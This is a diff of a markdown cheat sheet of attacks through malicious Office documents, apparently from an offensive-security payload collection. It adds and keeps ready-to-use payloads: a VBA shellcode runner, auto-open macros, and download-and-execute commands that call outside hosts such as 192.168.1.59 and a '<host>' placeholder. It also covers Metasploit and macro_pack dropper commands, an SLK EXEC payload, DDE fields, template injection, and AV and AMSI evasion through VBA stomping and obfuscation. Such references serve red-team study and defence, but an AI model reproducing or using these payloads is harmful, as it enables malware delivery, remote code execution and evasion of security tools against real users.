@@ -1,34 +1,106 @@
 # Office - Attacks 
 
-## Summary
+### Summary
 
-* [XLSM - Hot Manchego](#xlsm---hot-manchego)
-* [XLS - Macrome](#xls---macrome)
-* [XLM Excel 4.0 - SharpShooter](#xlm-excel-40---sharpshooter)
-* [XLM Excel 4.0 - EXCELntDonut](#xlm-excel-40---excelntdonut)
-* [XLM Excel 4.0 - EXEC](#xlm-excel-40---exec)
-* [DOCM - Metasploit](#docm---metasploit)
-* [DOCM - Download and Execute](#docm---download-and-execute)
-* [DOCM - Macro Creator](#docm---macro-creator)
-* [DOCM - C# converted to Office VBA macro](#docm---c-converted-to-office-vba-macro)
-* [DOCM - VBA Wscript](#docm---vba-wscript)
-* [DOCM - VBA Shell Execute Comment](#docm---vba-shell-execute-comment)
-* [DOCM - VBA Spawning via svchost.exe using Scheduled Task](#docm---vba-spawning-via-svchost-exe-using-scheduled-task)
-* [DCOM - WMI COM functions (VBA AMSI)](#docm---wmi-com-functions-vba-amsi)
-* [DOCM - winmgmts](#docm---winmgmts)
-* [DOCM - Macro Pack - Macro and DDE](#dcom---macro-pack---macro-and-dde)
-* [DOCM - CACTUSTORCH VBA Module](#docm---cactustorch-vba-module)
-* [VBA Obfuscation](#vba-obfuscation)
-* [VBA Purging](#vba-purging)
-    * [OfficePurge](#officepurge)
-    * [EvilClippy](#evilclippy)
-* [VBA AMSI](#vba-amsi)
-* [VBA - Offensive Security Template](#vba---offensive-security-template)
-* [DOCX - Template Injection](#docx---template-injection)
-* [DOCX - DDE](#docx---dde)
+* [Office Products Features](#office-products-features)
+* [Office Default Passwords](#office-default-passwords)
+* [Office Macro execute WinAPI](#office-macro-execute-winapi)
+* [Excel](#excel)
+    * [XLSM - Hot Manchego](#xlsm---hot-manchego)
+    * [XLS - Macrome](#xls---macrome)
+    * [XLM Excel 4.0 - SharpShooter](#xlm-excel-40---sharpshooter)
+    * [XLM Excel 4.0 - EXCELntDonut](#xlm-excel-40---excelntdonut)
+    * [XLM Excel 4.0 - EXEC](#xlm-excel-40---exec)
+    * [SLK - EXEC](#slk---exec)
+* [Word](#word)
+    * [DOCM - Metasploit](#docm---metasploit)
+    * [DOCM - Download and Execute](#docm---download-and-execute)
+    * [DOCM - Macro Creator](#docm---macro-creator)
+    * [DOCM - C# converted to Office VBA macro](#docm---c-converted-to-office-vba-macro)
+    * [DOCM - VBA Wscript](#docm---vba-wscript)
+    * [DOCM - VBA Shell Execute Comment](#docm---vba-shell-execute-comment)
+    * [DOCM - VBA Spawning via svchost.exe using Scheduled Task](#docm---vba-spawning-via-svchostexe-using-scheduled-task)
+    * [DCOM - WMI COM functions (VBA AMSI)](#docm---wmi-com-functions)
+    * [DOCM - winmgmts](#docm---winmgmts)
+    * [DOCM - Macro Pack - Macro and DDE](#docmxlm---macro-pack---macro-and-dde)
+    * [DOCM - BadAssMacros](#docm---badassmacros)
+    * [DOCM - CACTUSTORCH VBA Module](#docm---cactustorch-vba-module)
+    * [DOCM - MMG with Custom DL + Exec](#docm---mmg-with-custom-dl--exec)
+    * [VBA Obfuscation](#vba-obfuscation)
+    * [VBA Purging](#vba-purging)
+        * [OfficePurge](#officepurge)
+        * [EvilClippy](#evilclippy)
+    * [VBA AMSI](#vba-amsi)
+    * [VBA - Offensive Security Template](#vba---offensive-security-template)
+    * [DOCX - Template Injection](#docx---template-injection)
+    * [DOCX - DDE](#docx---dde)
 * [References](#references)
 
-## XLSM - Hot Manchego 
+## Office Products Features
+
+![Overview of features supported by different Office products](https://www.securesystems.de/images/blog/offphish-phishing-revisited-in-2023/Office_documents_feature_overview.png)
+
+
+## Office Default Passwords
+
+By default, Excel does not set a password when saving a new file. However, some older versions of Excel had a default password that was used if the user did not set a password themselves. The default password was "`VelvetSweatshop`", and it could be used to open any file that did not have a password set.
+
+> If the user has not supplied an encryption password and the document is encrypted, the default encryption choice using the techniques specified in section 2.3 MUST be the following password: "`\x2f\x30\x31\x48\x61\x6e\x6e\x65\x73\x20\x52\x75\x65\x73\x63\x68\x65\x72\x2f\x30\x31`". - [2.4.2.3 Binary Document Write Protection Method 3](https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-offcrypto/57fc02f0-c1de-4fc6-908f-d146104662f5)
+
+| Product    | Password         | Supported Formats |
+|------------|------------------|-------------------|
+| Excel      | VelvetSweatshop  | all Excel formats |
+| PowerPoint | 01Hannes Ruescher/01 | .pps .ppt     |
+
+## Office Macro execute WinAPI
+
+### Description
+
+To importe Win32 function we need to use the keyword `Private Declare`
+`Private Declare Function <NAME> Lib "<DLL_NAME>" Alias "<FUNCTION_IMPORTED>" (<ByVal/ByRef> <NAME_VAR> As <TYPE>, etc.) As <TYPE>`
+If we work on 64bit, we need to add the keyword `PtrSafe` between the keywords `Declare` and `Function`
+Importing the `GetUserNameA` from `advapi32.dll`: 
+```VBA
+Private Declare PtrSafe Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nSize As Long) As Long
+```
+`GetUserNameA` prototype in C: 
+```C
+BOOL GetUserNameA(
+  LPSTR   lpBuffer,
+  LPDWORD pcbBuffer
+);
+```
+### Example with a simple Shellcode Runner
+```VBA
+Private Declare PtrSafe Function VirtualAlloc Lib "Kernel32.dll" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "Kernel32.dll" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32.dll" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+
+Sub WinAPI()
+    Dim buf As Variant
+    Dim addr As LongPtr
+    Dim counter As Long
+    Dim data As Long
+
+    buf = Array(252, ...)
+    
+    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
+    
+
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, 1)
+    Next counter
+    res = CreateThread(0, 0, addr, 0, 0, 0)
+    
+
+End Sub
+```
+
+
+## Excel
+
+### XLSM - Hot Manchego 
 
 > When using EPPlus, the creation of the Excel document varied significantly enough that most A/V didn't catch a simple lolbas payload to get a beacon on a target machine.
 
@@ -41,7 +113,7 @@ PS> C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /reference:EPPlus.dll 
 PS> .\hot-manchego.exe .\blank.xlsm .\vba.txt
 ```
 
-## XLM - Macrome
+### XLM - Macrome
 
 > XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.
 
@@ -72,7 +144,7 @@ Macrome build --decoy-document decoy_document.xls --payload-type Macro --payload
 When using Macrome build mode, the --password flag may be used to encrypt the generated document using XOR Obfuscation. If the default password of **VelvetSweatshop** is used when building the document, all versions of Excel will automatically decrypt the document without any additional user input. This password can only be set in Excel 2003.
 
 
-## XLM Excel 4.0 - SharpShooter
+### XLM Excel 4.0 - SharpShooter
 
 * https://github.com/mdsecactivebreach/SharpShooter
 
@@ -96,7 +168,7 @@ SharpShooter.py --payload slk --output foo --rawscfile /tmp/shellcode-86.bin --s
 ```
 
 
-## XLM Excel 4.0 - EXCELntDonut
+### XLM Excel 4.0 - EXCELntDonut
 
 * XLM (Excel 4.0) macros pre-date VBA and can be delivered in .xls files.
 * AMSI has no visibility into XLM macros (for now)
@@ -138,7 +210,7 @@ python3 drive.py --x64bin GruntHttpx64.bin --x86bin GruntHttpx86.bin
 XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md
 
 
-## XLM Excel 4.0 - EXEC
+### XLM Excel 4.0 - EXEC
 
 1. Right Click to the current sheet
 2. Insert a **Macro IntL MS Excel 4.0**
@@ -151,7 +223,20 @@ XLM: https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f13
 5. Hide your macro worksheet by a right mouse click on the sheet name **Macro1** and selecting **Hide**
 
 
-## DOCM - Metasploit
+### SLK - EXEC
+
+```ps1
+ID;P
+O;E
+NN;NAuto_open;ER101C1;KOut Flank;F
+C;X1;Y101;K0;EEXEC("c:\shell.cmd")
+C;X1;Y102;K0;EHALT()
+E
+```
+
+## Word
+
+### DOCM - Metasploit
 
 ```ps1
 use exploit/multi/fileformat/office_word_macro
@@ -164,7 +249,7 @@ set FILENAME Financial2021.docm
 exploit -j
 ```
 
-## DOCM - Download and Execute
+### DOCM - Download and Execute
 
 > Detected by Defender (AMSI)
 
@@ -179,7 +264,7 @@ Execute
 End Sub
 ```
 
-## DOCM - Macro Creator
+### DOCM - Macro Creator
 
 * https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator
 
@@ -192,7 +277,7 @@ C:\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdav
 C:\PS> Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
 ```
 
-## DOCM - C# converted to Office VBA macro
+### DOCM - C# converted to Office VBA macro
 
 > A message will prompt to the user saying that the file is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking the excel document is corrupted.
 
@@ -202,7 +287,7 @@ https://github.com/trustedsec/unicorn
 python unicorn.py payload.cs cs macro
 ```
 
-## DOCM - VBA Wscript
+### DOCM - VBA Wscript
 
 > https://www.darkoperator.com/blog/2017/11/11/windows-defender-exploit-guard-asr-rules-for-office
 
@@ -221,7 +306,13 @@ Sub Auto_Open()
 End Sub
 ```
 
-## DOCM - VBA Shell Execute Comment
+```vb
+CreateObject("WScript.Shell").Run "calc.exe"
+CreateObject("WScript.Shell").Exec "notepad.exe"
+```
+
+
+### DOCM - VBA Shell Execute Comment
 
 Set your command payload inside the **Comment** metadata of the document.
 
@@ -245,7 +336,7 @@ End Sub
 ```
 
 
-## DOCM - VBA Spawning via svchost.exe using Scheduled Task
+### DOCM - VBA Spawning via svchost.exe using Scheduled Task
 
 ```ps1
 Sub AutoOpen()
@@ -269,7 +360,9 @@ End Sub
 Rem powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))"
 ```
 
-## DOCM - WMI COM functions
+### DOCM - WMI COM functions
+
+Basic WMI exec (detected by Defender) : `r = GetObject("winmgmts:\\.\root\cimv2:Win32_Process").Create("calc.exe", null, null, intProcessID)`
 
 ```ps1
 Sub wmi_exec()
@@ -307,13 +400,17 @@ Sub AutoOpen()
 End Sub
 ```
 
+```ps1
+Const ShellWindows = "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"
+Set SW = GetObject("new:" & ShellWindows).Item()
+SW.Document.Application.ShellExecute "cmd.exe", "/c powershell.exe", "C:\Windows\System32", Null, 0
+```
 
-## DOCM/XLM - Macro Pack - Macro and DDE
+### DOCM/XLM - Macro Pack - Macro and DDE
 
 > Only the community version is available online.
 
-* git clone https://github.com/sevagas/macro_pack
-* https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe
+* [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe)
 
 ```powershell
 # Options
@@ -371,8 +468,31 @@ echo "x86.bin" "x64.bin" | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_
 echo "http://192.168.5.10:8080/x32calc.bin" "http://192.168.5.10:8080/x64calc.bin" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G samples\sc_dl.xls
 ```
 
+### DOCM - BadAssMacros
 
-## DOCM - CACTUSTORCH VBA Module
+> C# based automated Malicous Macro Generator.
+
+* https://github.com/Inf0secRabbit/BadAssMacros
+
+```powershell
+BadAssMacros.exe -h
+
+# Create VBA for classic shellcode injection from raw shellcode
+BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic -c <caesar_shift_value> -o <path_to_output_file>
+BadAssMacros.exe -i .\Desktop\payload.bin -w doc -p no -s classic -c 23 -o .\Desktop\output.txt
+
+# Create VBA for indirect shellcode injection from raw shellcode
+BadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s indirect -o <path_to_output_file>
+
+# List modules inside Doc/Excel file
+BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -l
+
+# Purge Doc/Excel file
+BadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -o <path_to_output_file> -m <module_name>
+```
+
+
+### DOCM - CACTUSTORCH VBA Module
 
 > CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled binary into memory and execute it from vbscript
 
@@ -394,7 +514,7 @@ echo "http://192.168.5.10:8080/x32calc.bin" "http://192.168.5.10:8080/x64calc.bi
 6. Use the generated code to replace the hardcoded binary in CactusTorch
 
 
-## DOCM - MMG with Custom DL + Exec
+### DOCM - MMG with Custom DL + Exec
 
 1. Custom Download in first Macro to "C:\\Users\\Public\\beacon.exe"
 2. Create a custom binary execute using MMG
@@ -416,7 +536,7 @@ python MMG.py configs/generic-cmd.json malicious.vba
 }
 ```
 
-```ps1
+```vb
 Private Declare PtrSafe Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
 
 Public Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String) As Boolean
@@ -443,7 +563,19 @@ Sub Auto_Open()
 End Sub
 ```
 
-## VBA Obfuscation
+### DOCM - ActiveX-based (InkPicture control, Painted event) Autorun macro
+
+Go to **Developer tab** on ribbon `-> Insert -> More Controls -> Microsoft InkPicture Control` 
+
+```vb
+Private Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)
+Run = Shell("cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://<host>/file.exe','file.exe');Start-Process 'file.exe'", vbNormalFocus)
+End Sub
+```
+
+
+
+### VBA Obfuscation
 
 ```ps1
 # https://www.youtube.com/watch?v=L0DlPOLx2k0
@@ -451,13 +583,13 @@ $ git clone https://github.com/bonnetn/vba-obfuscator
 $ cat example_macro/download_payload.vba | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin
 ```
 
-## VBA Purging
+### VBA Purging
 
 **VBA Stomping**: This technique allows attackers to remove compressed VBA code from Office documents and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection. == Removes P-code. 
 
 :warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.
 
-### OfficePurge
+#### OfficePurge
 * https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe
 
 ```powershell
@@ -468,7 +600,7 @@ OfficePurge.exe -d word -f .\malicious.doc -l
 ```
 
 
-### EvilClippy
+#### EvilClippy
 
 > Evil Clippy uses the OpenMCDF library to manipulate CFBF files. 
 > Evil Clippy compiles perfectly fine with the Mono C# compiler and has been tested on Linux, OSX and Windows.
@@ -490,7 +622,7 @@ EvilClippy.exe -r macrofile.doc
 ```
 
 
-## VBA - Offensive Security Template
+### VBA - Offensive Security Template
 
 * Reverse Shell VBA - https://github.com/JohnWoodman/VBA-Macro-Reverse-Shell/blob/main/VBA-Reverse-Shell.vba
 * Process Dumper - https://github.com/JohnWoodman/VBA-Macro-Dump-Process
@@ -500,7 +632,7 @@ EvilClippy.exe -r macrofile.doc
 * amsiByPassWithRTLMoveMemory - https://gist.github.com/DanShaqFu/1c57c02660b2980d4816d14379c2c4f3
 * VBA macro spawning a process with a spoofed parent - https://github.com/christophetd/spoofing-office-macro/blob/master/macro64.vba
 
-## VBA - AMSI
+### VBA - AMSI
 
 > The Office VBA integration with AMSI is made up of three parts: (a) logging macro behavior, (b) triggering a scan on suspicious behavior, and (c) stopping a malicious macro upon detection. https://www.microsoft.com/security/blog/2018/09/12/office-vba-amsi-parting-the-veil-on-malicious-macros/
 
@@ -542,11 +674,11 @@ Private Sub Document_Open()
 End Sub
 ```
 
-## DOCX - Template Injection
+### DOCX - Template Injection
 
 :warning: Does not require "Enable Macro"
 
-### Remote Template
+#### Remote Template
 
 1. A malicious macro is saved in a Word template .dotm file
 2. Benign .docx file is created based on one of the default MS Word Document templates
@@ -564,7 +696,7 @@ End Sub
     ```
 7. File gets zipped back up again and renamed to .docx
 
-### Template Injections Tools
+#### Template Injections Tools
 
 * https://github.com/JohnWoodman/remoteInjector
 * https://github.com/ryhanson/phishery
@@ -578,22 +710,12 @@ $ phishery -u https://secure.site.local/docs -i good.docx -o bad.docx
 ```
 
 
-## DOCX - DDE
+### DOCX - DDE
 
 * Insert > QuickPart > Field
 * Right Click > Toggle Field Code
 * `{ DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe" }`
 
-## SLK - Excel
-
-```ps1
-ID;P
-O;E
-NN;NAuto_open;ER101C1;KOut Flank;F
-C;X1;Y101;K0;EEXEC("c:\shell.cmd")
-C;X1;Y102;K0;EHALT()
-E
-```
 
 ## References
 
@@ -620,3 +742,6 @@ E
 * [Dechaining macros and evading EDR - Noora Hyvärinen](https://blog.f-secure.com/dechaining-macros-and-evading-edr/)
 * [Executing macros from docx with remote - RedXORBlueJuly 18, 2018](http://blog.redxorblue.com/2018/07/executing-macros-from-docx-with-remote.html)
 * [One thousand and one ways to copy your shellcode to memory (VBA Macros) - X-C3LL - Feb 18, 2021](https://adepts.of0x.cc/alternatives-copy-shellcode/)
+* [Running macros via ActiveX controls - greyhathacker - September 29, 2016](http://www.greyhathacker.net/?p=948)
+* [Anti-Analysis Techniques Used in Excel 4.0 Macros - 24 March 2021 - @Jacob_Pimental](https://www.goggleheadedhacker.com/blog/post/23)
+* [So you think you can block Macros? - Pieter Ceelen - April 25, 2023](https://outflank.nl/blog/2023/04/25/so-you-think-you-can-block-macros/)
